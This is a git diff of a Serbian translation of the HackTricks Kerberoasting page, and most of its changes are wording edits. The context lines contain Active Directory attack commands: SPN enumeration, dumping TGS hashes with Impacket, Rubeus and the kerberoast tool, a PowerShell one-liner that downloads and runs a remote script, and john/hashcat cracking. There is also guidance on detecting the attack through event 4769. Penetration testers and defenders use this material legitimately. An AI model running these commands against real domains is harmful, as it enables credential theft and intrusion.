@@ -3,7 +3,7 @@
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatom** zajednice.\
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatima zajednice**.\
 Pribavite pristup danas:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
@@ -14,7 +14,7 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Podrška HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -25,21 +25,21 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 ## Kerberoast
 
-Kerberoasting se fokusira na sticanje **TGS karata**, posebno onih povezanih sa uslugama koje rade pod **korisničkim nalozima** u **Active Directory (AD)**, isključujući **računare**. Enkripcija ovih karata koristi ključeve koji potiču od **korisničkih lozinki**, što omogućava mogućnost **offline kriptovanja**. Korišćenje korisničkog naloga kao usluge označeno je ne-praznom **"ServicePrincipalName"** svojstvom.
+Kerberoasting se fokusira na sticanje **TGS karata**, posebno onih povezanih sa uslugama koje rade pod **korisničkim nalozima** u **Active Directory (AD)**, isključujući **računare**. Enkripcija ovih karata koristi ključeve koji potiču od **korisničkih lozinki**, što omogućava mogućnost **offline krakenja kredencijala**. Korišćenje korisničkog naloga kao usluge označeno je ne-praznom **"ServicePrincipalName"** svojstvom.
 
-Za izvršavanje **Kerberoasting-a**, neophodan je domen nalog sposoban da zahteva **TGS karte**; međutim, ovaj proces ne zahteva **posebne privilegije**, što ga čini dostupnim svima sa **validnim domen lozinkama**.
+Za izvršavanje **Kerberoasting-a**, neophodan je domen nalog sposoban da zahteva **TGS karte**; međutim, ovaj proces ne zahteva **posebne privilegije**, što ga čini dostupnim svima sa **validnim domen kredencijalima**.
 
 ### Ključne tačke:
 
 * **Kerberoasting** cilja **TGS karte** za **usluge korisničkih naloga** unutar **AD**.
-* Karte enkriptovane sa ključevima iz **korisničkih lozinki** mogu se **krakovati offline**.
+* Karte enkriptovane sa ključevima iz **korisničkih lozinki** mogu se **krakati offline**.
 * Usluga se identifikuje po **ServicePrincipalName** koji nije null.
-* **Nema posebnih privilegija** potrebnih, samo **validne domen lozinke**.
+* **Nema posebnih privilegija** potrebnih, samo **validni domen kredencijali**.
 
 ### **Napad**
 
 {% hint style="warning" %}
-**Kerberoasting alati** obično zahtevaju **`RC4 enkripciju`** prilikom izvođenja napada i iniciranja TGS-REQ zahteva. To je zato što je **RC4** [**slabiji**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i lakše se krakuje offline koristeći alate kao što je Hashcat nego druge algoritme enkripcije kao što su AES-128 i AES-256.\
+**Kerberoasting alati** obično zahtevaju **`RC4 enkripciju`** prilikom izvođenja napada i iniciranja TGS-REQ zahteva. To je zato što je **RC4** [**slabiji**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i lakše se kraka offline koristeći alate kao što je Hashcat nego druge algoritme enkripcije kao što su AES-128 i AES-256.\
 RC4 (tip 23) heševi počinju sa **`$krb5tgs$23$*`** dok AES-256 (tip 18) počinju sa **`$krb5tgs$18$*`**.` 
 {% endhint %}
 
@@ -54,7 +54,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Multi-features alati uključuju dump kerberoastable korisnika:
+Мултифункционални алати укључујући извлачење корисника који су подложни kerberoast-у:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -68,7 +68,7 @@ setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-* **Tehnika 1: Zatraži TGS i isprazni ga iz memorije**
+* **Tehnika 1: Zatražite TGS i izvadite ga iz memorije**
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -105,18 +105,18 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-Kada se zatraži TGS, generiše se Windows događaj `4769 - A Kerberos service ticket was requested`.
+Kada se zatraži TGS, generiše se Windows događaj `4769 - Zatražen je Kerberos servisni tiket`.
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim **alatima** zajednice na svetu.\
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) da lako izgradite i **automatizujete radne tokove** pokretane od strane **najnaprednijih** alata zajednice.\
 Pribavite pristup danas:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
-### Kršenje
+### Kracking
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -137,7 +137,7 @@ Ako dobijete ovu **grešku** iz Linux-a: **`Kerberos SessionError: KRB_AP_ERR_SK
 
 ### Ublažavanje
 
-Kerberoasting se može sprovoditi sa visokim stepenom prikrivenosti ako je moguće iskoristiti. Da bi se otkrila ova aktivnost, treba obratiti pažnju na **ID sigurnosnog događaja 4769**, koji ukazuje da je Kerberos tiket zatražen. Međutim, zbog visoke učestalosti ovog događaja, moraju se primeniti specifični filteri kako bi se izolovale sumnjive aktivnosti:
+Kerberoasting se može sprovoditi sa visokim stepenom prikrivenosti ako je moguće iskoristiti. Da bi se otkrila ova aktivnost, treba obratiti pažnju na **Security Event ID 4769**, koji ukazuje da je Kerberos tiket zatražen. Međutim, zbog visoke učestalosti ovog događaja, specifične filtracije moraju biti primenjene da bi se izolovale sumnjive aktivnosti:
 
 * Ime usluge ne bi trebalo da bude **krbtgt**, jer je to normalan zahtev.
 * Imena usluga koja se završavaju sa **$** treba isključiti kako bi se izbeglo uključivanje mašinskih naloga koji se koriste za usluge.
@@ -154,14 +154,14 @@ Da bi se smanjio rizik od Kerberoasting-a:
 
 Implementacijom ovih mera, organizacije mogu značajno smanjiti rizik povezan sa Kerberoasting-om.
 
-## Kerberoast bez domena naloga
+## Kerberoast bez domena
 
-U **septembru 2022**, novi način za eksploataciju sistema otkrio je istraživač po imenu Charlie Clark, podelivši to putem svoje platforme [exploit.ph](https://exploit.ph/). Ova metoda omogućava sticanje **Servisnih karata (ST)** putem **KRB\_AS\_REQ** zahteva, što izuzetno ne zahteva kontrolu nad bilo kojim Active Directory nalogom. Suštinski, ako je princip postavljen na način koji ne zahteva prethodnu autentifikaciju—scenario sličan onome što se u oblasti sajber bezbednosti naziva **AS-REP Roasting napad**—ova karakteristika se može iskoristiti za manipulaciju procesom zahteva. Konkretno, menjajući **sname** atribut unutar tela zahteva, sistem se obmanjuje da izda **ST** umesto standardne enkriptovane karte za dobijanje karte (TGT).
+U **septembru 2022**, novi način za eksploataciju sistema otkrio je istraživač po imenu Charlie Clark, podelivši to putem svoje platforme [exploit.ph](https://exploit.ph/). Ova metoda omogućava sticanje **Servisnih karata (ST)** putem **KRB\_AS\_REQ** zahteva, što izuzetno ne zahteva kontrolu nad bilo kojim Active Directory nalogom. Suštinski, ako je princip postavljen na način koji ne zahteva prethodnu autentifikaciju—scenario sličan onome što se u oblasti sajber bezbednosti naziva **AS-REP Roasting napad**—ova karakteristika se može iskoristiti za manipulaciju procesom zahteva. Konkretno, menjajući **sname** atribut unutar tela zahteva, sistem se obmanjuje da izda **ST** umesto standardne enkriptovane karte za dodeljivanje karata (TGT).
 
 Tehnika je u potpunosti objašnjena u ovom članku: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 {% hint style="warning" %}
-Morate pružiti listu korisnika jer nemamo važeći nalog za upit LDAP koristeći ovu tehniku.
+Morate pružiti listu korisnika jer nemamo validan nalog za upit LDAP koristeći ovu tehniku.
 {% endhint %}
 
 #### Linux
@@ -188,7 +188,7 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Podrška HackTricks</summary>
+<summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
